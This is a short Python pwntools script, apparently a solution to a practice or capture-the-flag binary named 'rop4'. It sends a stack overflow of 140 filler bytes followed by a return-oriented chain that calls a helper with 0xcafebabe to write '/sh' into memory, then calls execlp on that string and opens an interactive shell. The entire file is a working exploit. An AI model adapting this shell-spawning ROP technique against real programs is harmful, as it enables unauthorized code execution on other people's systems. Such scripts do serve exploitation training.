#!/usr/bin/env python

from pwn import *

# binary = ['strace', '-f', './rop4']
binary = ['./rop4']
r = process(binary)
call_me_with_cafebabe = p32(0x08048ef4)
pop_ret               = p32(0x080481ec)
cafebabe              = p32(0xcafebabe)
call_execlp           = p32(0x08048eed) # 0x8048eed <exec_the_string+29>: call 0x8053ab0 <execlp>
exec_string           = p32(0x080f112d)

# $ nm rop4 | grep exec_string
# 080f112c B exec_string

payload = "A" * 140
payload += call_me_with_cafebabe # this copies '/sh' to 080f112c, so we use 080f112d
payload += pop_ret
payload += cafebabe

payload += call_execlp
payload += exec_string
payload += p32(0)

r.sendline(payload)
# print (r.recv())
r.interactive()
